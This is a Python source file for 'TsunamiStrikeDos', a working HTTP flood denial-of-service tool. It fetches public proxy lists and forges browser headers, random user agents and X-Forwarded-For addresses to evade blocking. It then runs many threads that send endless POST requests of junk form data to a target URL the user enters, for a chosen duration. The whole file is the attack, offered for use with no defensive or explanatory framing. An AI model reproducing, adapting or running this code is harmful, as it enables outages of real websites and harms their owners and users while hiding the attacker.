import json
import random
import sys
import warnings
import string
import threading
import time
from typing import Dict, List
import requests
import faker
from colorama import Fore as F
from requests.exceptions import ConnectionError, Timeout
from fake_useragent import UserAgent
import os
from halo import Halo



os.system('clear')
__version__ = '4.0.4'
__method__ = 'HTTP'
#  
# --------------------------------------

sip = Halo()

print(f'''
{F.GREEN}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⣿⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣽⣿⣷⣴⣤⣤⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣏⣛⣛⣉⣛⡛⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⠟⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                {F.CYAN} TsunamiStrikeDos V{F.GREEN} {__version__}{F.RESET}

''')
print('_'*40)

# -------------------------------------------
sip.succeed(f'Method: {__method__}')
fake = faker.Faker()

def emailCreateFake():
    e = string.ascii_lowercase + string.digits + string.digits
    leng = random.randint(6,10)

    email_1 = ''.join(random.choice(e) for _ in range(leng))
    listMe = ['@hotmail.com', '@live.com', '@gmail.com', '@yahoo.com']
    ranListMe = random.choice(listMe)
    email = email_1 + ranListMe
    return email


def buildBlock(size):

    block = ''.join(random.choice(string.ascii_letters) for _ in range(size))
    return block

def dataRandom():
    return {
        'name': fake.name(),
        'message': buildBlock(random.randint(50,80))+'='+buildBlock(random.randint(50,80)),
        'email': emailCreateFake()
    }

warnings.filterwarnings("ignore", message="Unverified HTTPS request")


def get_http_proxies() -> List[Dict[str, str]]:
    """Return a list of available proxies from both HTTP and SOCKS4."""
    proxies = []
    try:
        # Fetch HTTP proxies
        with requests.get(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all",
            verify=False,
        ) as proxy_list_http:
            proxies_http = [
                {"http": "http://" + proxy, "https": "http://" + proxy}
                for proxy in proxy_list_http.text.split("\r\n")
                if proxy != ""
            ]
            proxies.extend(proxies_http)

        # Fetch SOCKS4 proxies
        with requests.get(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
            verify=False,
        ) as proxy_list_socks4:
            proxies_socks4 = [
                {"http": "socks4://" + proxy, "https": "socks4://" + proxy}
                for proxy in proxy_list_socks4.text.split("\r\n")
                if proxy != ""
            ]
            proxies.extend(proxies_socks4)

    except Timeout:
        print(f"\n{F.RED}[ !!! ] {F.CYAN}It was not possible to connect to the proxies!{F.RESET}")
        sys.exit(1)
    except ConnectionError:
        print(f"\n{F.RED}[ !!! ] {F.CYAN}Device is not connected to the Internet!{F.RESET}")
        sys.exit(1)

    return proxies

proxies = get_http_proxies()

# Create UserAgent instance
ua = UserAgent()

def generate_headers():
    """Generate more advanced headers to mimic real requests."""
    return {
        "User-Agent": ua.random,  # Use random User-Agent
        "X-Requested-With": random.choice(["XMLHttpRequest", "FetchRequest"]),
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com", "https://www.youtube.com","https://www.instagram.com", "https://www.facebook.com/"]),
        "DNT": "1",  # Do Not Track header
        "Upgrade-Insecure-Requests": "1",  # Common in browser requests
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "X-Forwarded-For": fake.ipv4()
    }

def flood(target: str) -> None:
    """Start an HTTP GET request flood through proxies."""
    global proxies
    fakedata = dataRandom()
    while True:  # Keep flooding until the program is stopped
        headers = generate_headers()
        try:
            proxy = random.choice(proxies)
            response = requests.post(target, data=fakedata, headers=headers, proxies=proxy, timeout=5)
        except (Timeout, OSError):
            continue
        else:
            status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
            payload_size = f"{F.GREEN} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
            proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
            ip_fake = f"IP: {headers['X-Forwarded-For']}"
            print(f"{status}: Request Sent! --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
            if response.status_code != 200:
                try:
                    proxies.remove(proxy)
                except ValueError:
                    proxies = get_http_proxies()

def start_flooding(target: str, thread_count: int, duration: int) -> None:
    """Start multiple threads to flood the target."""
    stop_time = time.time() + duration  # Calculate end time
    for _ in range(thread_count):
        thread = threading.Thread(target=flood, args=(target,))
        thread.daemon = True  # Allow threads to exit when main program exits
        thread.start()

    while time.time() < stop_time:
        time.sleep(1)  # Keep the main thread alive until duration ends

    print(f"\n{F.CYAN}( DONE ) {F.GREEN}Attac finished after {duration} seconds.{F.RESET}")

if __name__ == "__main__":
    target_url = input(f"{F.CYAN}(?){F.RESET} target URL: {F.GREEN}")
    num_threads = int(input(f"{F.CYAN}(?){F.RESET} threads: {F.GREEN}"))
    duration = int(input(f"{F.CYAN}(?){F.RESET} attack duration (seconds): {F.GREEN}"))

    start_flooding(target_url, num_threads, duration)

